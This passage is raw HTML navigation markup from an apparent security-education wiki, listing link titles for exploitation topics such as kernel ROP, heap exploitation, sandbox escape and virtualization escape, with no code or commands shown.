md-toggle" data-md-toggle=nav-9-1-1-4 type=checkbox id=nav-9-1-1-4> <label class=md-nav__link for=nav-9-1-1-4> Summary <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Summary data-md-level=4> <label class=md-nav__title for=nav-9-1-1-4> <span class="md-nav__icon md-icon"></span> Summary </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../summary/get-address/ class=md-nav__link> 獲取地址 </a> </li> <li class=md-nav__item> <a href=../../../summary/hijack-control-flow/ class=md-nav__link> 控制程序執行流 </a> </li> <li class=md-nav__item> <a href=../../../summary/get-shell/ class=md-nav__link> shell 獲取小結 </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-2 type=checkbox id=nav-9-1-2> <label class=md-nav__link for=nav-9-1-2> Kernel Mode <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Kernel Mode" data-md-level=3> <label class=md-nav__title for=nav-9-1-2> <span class="md-nav__icon md-icon"></span> Kernel Mode </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-2-1 type=checkbox id=nav-9-1-2-1> <label class=md-nav__link for=nav-9-1-2-1> Environment <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Environment data-md-level=4> <label class=md-nav__title for=nav-9-1-2-1> <span class="md-nav__icon md-icon"></span> Environment </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../kernel-mode/environment/readme/ class=md-nav__link> Introduction </a> </li> <li class=md-nav__item> <a href=../../../../kernel-mode/environment/build-kernel/ class=md-nav__link> 內核下載與編譯 </a> </li> <li class=md-nav__item> <a href=../../../../kernel-mode/environment/build-kernel-module/ class=md-nav__link> 編譯內核驅動 </a> </li> <li class=md-nav__item> <a href=../../../../kernel-mode/environment/qemu-emulate/ class=md-nav__link> Qemu 模擬環境 </a> </li> <li class=md-nav__item> <a href=../../../../kernel-mode/environment/real-device/ class=md-nav__link> Real Device </a> </li> <li class=md-nav__item> <a href=../../../../kernel-mode/environment/System.map/ class=md-nav__link> System.map </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-2-2 type=checkbox id=nav-9-1-2-2> <label class=md-nav__link for=nav-9-1-2-2> Basic Knowledge <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Basic Knowledge" data-md-level=4> <label class=md-nav__title for=nav-9-1-2-2> <span class="md-nav__icon md-icon"></span> Basic Knowledge </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../kernel-mode/basic-knowledge/ class=md-nav__link> 基礎知識 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-2-3 type=checkbox id=nav-9-1-2-3> <label class=md-nav__link for=nav-9-1-2-3> Aim <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Aim data-md-level=4> <label class=md-nav__title for=nav-9-1-2-3> <span class="md-nav__icon md-icon"></span> Aim </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../kernel-mode/aim/readme/ class=md-nav__link> Introduction </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-2-3-2 type=checkbox id=nav-9-1-2-3-2> <label class=md-nav__link for=nav-9-1-2-3-2> Privilege Escalation <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Privilege Escalation" data-md-level=5> <label class=md-nav__title for=nav-9-1-2-3-2> <span class="md-nav__icon md-icon"></span> Privilege Escalation </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../kernel-mode/aim/privilege-escalation/readme/ class=md-nav__link> Introduction </a> </li> <li class=md-nav__item> <a href=../../../../kernel-mode/aim/privilege-escalation/change-self/ class=md-nav__link> Change Self </a> </li> <li class=md-nav__item> <a href=../../../../kernel-mode/aim/privilege-escalation/change-others/ class=md-nav__link> Change Others </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../../../../kernel-mode/aim/info-leak/ class=md-nav__link> Information Disclosure </a> </li> <li class=md-nav__item> <a href=../../../../kernel-mode/aim/dos/ class=md-nav__link> DoS </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-2-4 type=checkbox id=nav-9-1-2-4> <label class=md-nav__link for=nav-9-1-2-4> Defense <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Defense data-md-level=4> <label class=md-nav__title for=nav-9-1-2-4> <span class="md-nav__icon md-icon"></span> Defense </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../kernel-mode/defense/readme/ class=md-nav__link> Introduction </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-2-4-2 type=checkbox id=nav-9-1-2-4-2> <label class=md-nav__link for=nav-9-1-2-4-2> Isolation <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Isolation data-md-level=5> <label class=md-nav__title for=nav-9-1-2-4-2> <span class="md-nav__icon md-icon"></span> Isolation </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../kernel-mode/defense/isolation/readme/ class=md-nav__link> Introduction </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-2-4-2-2 type=checkbox id=nav-9-1-2-4-2-2> <label class=md-nav__link for=nav-9-1-2-4-2-2> User and Kernel <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="User and Kernel" data-md-level=6> <label class=md-nav__title for=nav-9-1-2-4-2-2> <span class="md-nav__icon md-icon"></span> User and Kernel </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../kernel-mode/defense/isolation/user-kernel/readme/ class=md-nav__link> Introduction </a> </li> <li class=md-nav__item> <a href=../../../../kernel-mode/defense/isolation/user-kernel/user-code-execution/ class=md-nav__link> 用戶代碼不可執行 </a> </li> <li class=md-nav__item> <a href=../../../../kernel-mode/defense/isolation/user-kernel/user-data-access/ class=md-nav__link> 用戶數據不可訪問 </a> </li> <li class=md-nav__item> <a href=../../../../kernel-mode/defense/isolation/user-kernel/kpti/ class=md-nav__link> KPTI - Kernel Page Table Isolation </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-2-4-2-3 type=checkbox id=nav-9-1-2-4-2-3> <label class=md-nav__link for=nav-9-1-2-4-2-3> Inside Kernel <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Inside Kernel" data-md-level=6> <label class=md-nav__title for=nav-9-1-2-4-2-3> <span class="md-nav__icon md-icon"></span> Inside Kernel </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../kernel-mode/defense/isolation/inner-kernel/heap-chunk/ class=md-nav__link> 內部隔離 </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-2-4-3 type=checkbox id=nav-9-1-2-4-3> <label class=md-nav__link for=nav-9-1-2-4-3> Access Control <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Access Control" data-md-level=5> <label class=md-nav__title for=nav-9-1-2-4-3> <span class="md-nav__icon md-icon"></span> Access Control </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../kernel-mode/defense/access-control/readme/ class=md-nav__link> Introduction </a> </li> <li class=md-nav__item> <a href=../../../../kernel-mode/defense/access-control/information-disclosure/ class=md-nav__link> 信息泄漏 </a> </li> <li class=md-nav__item> <a href=../../../../kernel-mode/defense/access-control/misc/ class=md-nav__link> Misc </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-2-4-4 type=checkbox id=nav-9-1-2-4-4> <label class=md-nav__link for=nav-9-1-2-4-4> Detection <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Detection data-md-level=5> <label class=md-nav__title for=nav-9-1-2-4-4> <span class="md-nav__icon md-icon"></span> Detection </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../kernel-mode/defense/detection/readme/ class=md-nav__link> Introduction </a> </li> <li class=md-nav__item> <a href=../../../../kernel-mode/defense/detection/canary/ class=md-nav__link> Kernel Stack Canary </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-2-4-5 type=checkbox id=nav-9-1-2-4-5> <label class=md-nav__link for=nav-9-1-2-4-5> Randomization <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Randomization data-md-level=5> <label class=md-nav__title for=nav-9-1-2-4-5> <span class="md-nav__icon md-icon"></span> Randomization </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../kernel-mode/defense/randomization/readme/ class=md-nav__link> Introduction </a> </li> <li class=md-nav__item> <a href=../../../../kernel-mode/defense/randomization/kaslr/ class=md-nav__link> KASLR </a> </li> <li class=md-nav__item> <a href=../../../../kernel-mode/defense/randomization/fgkaslr/ class=md-nav__link> FGKASLR </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-2-5 type=checkbox id=nav-9-1-2-5> <label class=md-nav__link for=nav-9-1-2-5> Exploitation <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Exploitation data-md-level=4> <label class=md-nav__title for=nav-9-1-2-5> <span class="md-nav__icon md-icon"></span> Exploitation </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-2-5-1 type=checkbox id=nav-9-1-2-5-1> <label class=md-nav__link for=nav-9-1-2-5-1> Returned Oriented Programming <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Returned Oriented Programming" data-md-level=5> <label class=md-nav__title for=nav-9-1-2-5-1> <span class="md-nav__icon md-icon"></span> Returned Oriented Programming </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../kernel-mode/exploitation/rop/rop/ class=md-nav__link> Kernel ROP </a> </li> <li class=md-nav__item> <a href=../../../../kernel-mode/exploitation/rop/kpti-bypass/ class=md-nav__link> Kernel ROP with KPTI bypass </a> </li> <li class=md-nav__item> <a href=../../../../kernel-mode/exploitation/rop/ret2usr/ class=md-nav__link> ret2usr（已過時） </a> </li> <li class=md-nav__item> <a href=../../../../kernel-mode/exploitation/rop/bypass-smep/ class=md-nav__link> bypass-smep </a> </li> <li class=md-nav__item> <a href=../../../../kernel-mode/exploitation/rop/ret2ptregs/ class=md-nav__link> 利用 pt_regs 構造通用內核 ROP </a> </li> <li class=md-nav__item> <a href=../../../../kernel-mode/exploitation/rop/ret2dir/ class=md-nav__link> ret2dir </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-2-5-2 type=checkbox id=nav-9-1-2-5-2> <label class=md-nav__link for=nav-9-1-2-5-2> Heap Exploitation <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Heap Exploitation" data-md-level=5> <label class=md-nav__title for=nav-9-1-2-5-2> <span class="md-nav__icon md-icon"></span> Heap Exploitation </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../kernel-mode/exploitation/heap/heap_overview/ class=md-nav__link> 內核堆概述 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-2-5-2-2 type=checkbox id=nav-9-1-2-5-2-2> <label class=md-nav__link for=nav-9-1-2-5-2-2> slub allocator <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="slub allocator" data-md-level=6> <label class=md-nav__title for=nav-9-1-2-5-2-2> <span class="md-nav__icon md-icon"></span> slub allocator </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../kernel-mode/exploitation/heap/slub/uaf/ class=md-nav__link> kernel UAF </a> </li> <li class=md-nav__item> <a href=../../../../kernel-mode/exploitation/heap/slub/spray/ class=md-nav__link> Heap Spray </a> </li> <li class=md-nav__item> <a href=../../../../kernel-mode/exploitation/heap/slub/freelist/ class=md-nav__link> freelist 劫持 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-2-5-2-3 type=checkbox id=nav-9-1-2-5-2-3> <label class=md-nav__link for=nav-9-1-2-5-2-3> Buddy System <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Buddy System" data-md-level=6> <label class=md-nav__title for=nav-9-1-2-5-2-3> <span class="md-nav__icon md-icon"></span> Buddy System </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../kernel-mode/exploitation/heap/buddy/cross-cache/ class=md-nav__link> Cross-Cache Overflow &amp; Page-level Heap Fengshui </a> </li> <li class=md-nav__item> <a href=../../../../kernel-mode/exploitation/heap/buddy/page-uaf/ class=md-nav__link> Page-level UAF </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-2-5-3 type=checkbox id=nav-9-1-2-5-3> <label class=md-nav__link for=nav-9-1-2-5-3> Race Condition <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Race Condition" data-md-level=5> <label class=md-nav__title for=nav-9-1-2-5-3> <span class="md-nav__icon md-icon"></span> Race Condition </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../kernel-mode/exploitation/race/double-fetch/ class=md-nav__link> Double Fetch </a> </li> <li class=md-nav__item> <a href=../../../../kernel-mode/exploitation/race/userfaultfd/ class=md-nav__link> userfaultfd 的使用 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-2-5-4 type=checkbox id=nav-9-1-2-5-4> <label class=md-nav__link for=nav-9-1-2-5-4> Tricks <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Tricks data-md-level=5> <label class=md-nav__title for=nav-9-1-2-5-4> <span class="md-nav__icon md-icon"></span> Tricks </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../kernel-mode/exploitation/tricks/initramfs/ class=md-nav__link> 在內存中直接搜索 flag </a> </li> </ul> </nav> </li> </ul> </nav> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-2 type=checkbox id=nav-9-2> <label class=md-nav__link for=nav-9-2> Windows Platform <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Windows Platform" data-md-level=2> <label class=md-nav__title for=nav-9-2> <span class="md-nav__icon md-icon"></span> Windows Platform </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../windows/readme/ class=md-nav__link> 概述 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-2-2 type=checkbox id=nav-9-2-2> <label class=md-nav__link for=nav-9-2-2> User Mode <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="User Mode" data-md-level=3> <label class=md-nav__title for=nav-9-2-2> <span class="md-nav__icon md-icon"></span> User Mode </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../windows/user-mode/readme/ class=md-nav__link> Readme </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-2-2-2 type=checkbox id=nav-9-2-2-2> <label class=md-nav__link for=nav-9-2-2-2> 棧溢出 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=棧溢出 data-md-level=4> <label class=md-nav__title for=nav-9-2-2-2> <span class="md-nav__icon md-icon"></span> 棧溢出 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../windows/user-mode/stackoverflow/stack-introduction/ class=md-nav__link> 棧介紹 </a> </li> <li class=md-nav__item> <a href=../../../../../windows/user-mode/stackoverflow/stackoverflow-basic/ class=md-nav__link> 棧溢出原理 </a> </li> <li class=md-nav__item> <a href=../../../../../windows/user-mode/stackoverflow/shellcode-in-stack/ class=md-nav__link> 執行 Shellcode </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-2-2-3 type=checkbox id=nav-9-2-2-3> <label class=md-nav__link for=nav-9-2-2-3> 栈溢出 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=栈溢出 data-md-level=4> <label class=md-nav__title for=nav-9-2-2-3> <span class="md-nav__icon md-icon"></span> 栈溢出 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../windows/user-mode/stackoverflow/ret2dll/ class=md-nav__link> ret2dll利用 </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-2-3 type=checkbox id=nav-9-2-3> <label class=md-nav__link for=nav-9-2-3> Kernel Mode <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Kernel Mode" data-md-level=3> <label class=md-nav__title for=nav-9-2-3> <span class="md-nav__icon md-icon"></span> Kernel Mode </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../windows/kernel-mode/readme/ class=md-nav__link> Readme </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-3 type=checkbox id=nav-9-3> <label class=md-nav__link for=nav-9-3> MacOS Platform <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="MacOS Platform" data-md-level=2> <label class=md-nav__title for=nav-9-3> <span class="md-nav__icon md-icon"></span> MacOS Platform </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../macos/readme/ class=md-nav__link> MacOS </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-4 type=checkbox id=nav-9-4> <label class=md-nav__link for=nav-9-4> Misc OS Platform <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Misc OS Platform" data-md-level=2> <label class=md-nav__title for=nav-9-4> <span class="md-nav__icon md-icon"></span> Misc OS Platform </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../misc-os/readme/ class=md-nav__link> Readme </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-5 type=checkbox id=nav-9-5> <label class=md-nav__link for=nav-9-5> Sandbox Escape <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Sandbox Escape" data-md-level=2> <label class=md-nav__title for=nav-9-5> <span class="md-nav__icon md-icon"></span> Sandbox Escape </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-5-1 type=checkbox id=nav-9-5-1> <label class=md-nav__link for=nav-9-5-1> python <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=python data-md-level=3> <label class=md-nav__title for=nav-9-5-1> <span class="md-nav__icon md-icon"></span> python </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../sandbox/python/python-sandbox-escape/ class=md-nav__link> Python 沙盒 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-5-2 type=checkbox id=nav-9-5-2> <label class=md-nav__link for=nav-9-5-2> shell <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=shell data-md-level=3> <label class=md-nav__title for=nav-9-5-2> <span class="md-nav__icon md-icon"></span> shell </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../sandbox/shell/readme/ class=md-nav__link> Shell Sandbox </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-5-3 type=checkbox id=nav-9-5-3> <label class=md-nav__link for=nav-9-5-3> seccomp <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=seccomp data-md-level=3> <label class=md-nav__title for=nav-9-5-3> <span class="md-nav__icon md-icon"></span> seccomp </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../sandbox/seccomp/c-sandbox-escape/ class=md-nav__link> C 沙盒逃逸 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-5-4 type=checkbox id=nav-9-5-4> <label class=md-nav__link for=nav-9-5-4> namespace <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=namespace data-md-level=3> <label class=md-nav__title for=nav-9-5-4> <span class="md-nav__icon md-icon"></span> namespace </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../sandbox/namespace/readme/ class=md-nav__link> Namespace </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-5-5 type=checkbox id=nav-9-5-5> <label class=md-nav__link for=nav-9-5-5> chroot <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=chroot data-md-level=3> <label class=md-nav__title for=nav-9-5-5> <span class="md-nav__icon md-icon"></span> chroot </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../sandbox/chroot/readme/ class=md-nav__link> Chroot </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-5-6 type=checkbox id=nav-9-5-6> <label class=md-nav__link for=nav-9-5-6> docker <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=docker data-md-level=3> <label class=md-nav__title for=nav-9-5-6> <span class="md-nav__icon md-icon"></span> docker </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../sandbox/docker/readme/ class=md-nav__link> Docker </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-6 type=checkbox id=nav-9-6> <label class=md-nav__link for=nav-9-6> Virtualization <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Virtualization data-md-level=2> <label class=md-nav__title for=nav-9-6> <span class="md-nav__icon md-icon"></span> Virtualization </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-6-1 type=checkbox id=nav-9-6-1> <label class=md-nav__link for=nav-9-6-1> 基礎知識 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=基礎知識 data-md-level=3> <label class=md-nav__title for=nav-9-6-1> <span class="md-nav__icon md-icon"></span> 基礎知識 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../virtualization/basic-knowledge/basic-knowledge/ class=md-nav__link> 虛擬化技術簡介 </a> </li> <li class=md-nav__item> <a href=../../../../../virtualization/basic-knowledge/cpu-virtualization/ class=md-nav__link> CPU 虛擬化 </a> </li> <li class=md-nav__item> <a href=../../../../../virtualization/basic-knowledge/mem-virtualization/ class=md-nav__link> 內存虛擬化 </a> </li> <li class=md-nav__item> <a href=../../../../../virtualization/basic-knowledge/io-virtualization/ class=md-nav__link> IO 虛擬化 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-6-2 type=checkbox id=nav-9-6-2> <label class=md-nav__link for=nav-9-6-2> QEMU <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=QEMU data-md-level=3> <label class=md-nav__title for=nav-9-6-2> <span class="md-nav__icon md-icon"></span> QEMU </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-6-2-1 type=checkbox id=nav-9-6-2-1> <label class=md-nav__link for=nav-9-6-2-1> 基礎知識 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=基礎知識 data-md-level=4> <label class=md-nav__title for=nav-9-6-2-1> <span class="md-nav__icon md-icon"></span> 基礎知識 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../virtualization/qemu/basic-knowledge/mm/ class=md-nav__link> QEMU 內存管理 </a> </li> <li class=md-nav__item> <a href=../../../../../virtualization/qemu/basic-knowledge/dev/ class=md-nav__link> QEMU 設備模擬 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-6-2-2 type=checkbox id=nav-9-6-2-2> <label class=md-nav__link for=nav-9-6-2-2> 環境搭建 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=環境搭建 data-md-level=4> <label class=md-nav__title for=nav-9-6-2-2> <span class="md-nav__icon md-icon"></span> 環境搭建 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../virtualization/qemu/environment/build-qemu/ class=md-nav__link> QEMU 下載與編譯 </a> </li> <li class=md-nav__item> <a href=../../../../../virtualization/qemu/environment/build-qemu-dev/ class=md-nav__link> 編寫 QEMU 模擬設備 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-6-2-3 type=checkbox id=nav-9-6-2-3> <label class=md-nav__link for=nav-9-6-2-3> Exploitation <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Exploitation data-md-level=4> <label class=md-nav__title for=nav-9-6-2-3> <span class="md-nav__icon md-icon"></span> Exploitation </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../virtualization/qemu/exploitation/intro/ class=md-nav__link> QEMU 逃逸入門 </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-6-3 type=checkbox id=nav-9-6-3> <label class=md-nav__link for=nav-9-6-3> Virtual Box <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Virtual Box" data-md-level=3> <label class=md-nav__title for=nav-9-6-3> <span class="md-nav__icon md-icon"></span> Virtual Box </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../virtualization/virtualbox/readme/ class=md-nav__link> VirtualBox </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-6-4 type=checkbox id=nav-9-6-4> <label class=md-nav__link for=nav-9-6-4> VMWare <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=VMWare data-md-level=3> <label class=md-nav__title for=nav-9-6-4> <span class="md-nav__icon md-icon"></span> VMWare </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../virtualization/vmware/readme/ class=md-nav__link> VMWare </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-6-5 type=checkbox id=nav-9-6-5> <label class=md-nav__link for=nav-9-6-5> Parallels <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Parallels data-md-level=3> <label class=md-nav__title for=nav-9-6-5> <span class="md-nav__icon md-icon"></span> Parallels </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../virtualization/parallels/readmd/ class=md-nav__link> Parallels </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-7 type=checkbox id=nav-9-7> <label class=md-nav__link for=nav-9-7> Browser <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Browser data-md-level=2> <label class=md-nav__title for=nav-9-7> <span class="md-nav__icon md-icon"></span> Browser </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-7-1 type=checkbox id=nav-9-7-1> <label class=md-nav__link for=nav-9-7-1> Chrome <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Chrome data-md-level=3> <label class=md-nav__title for=nav-9-7-1> <span class="md-nav__icon md-icon"></span> Chrome </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a 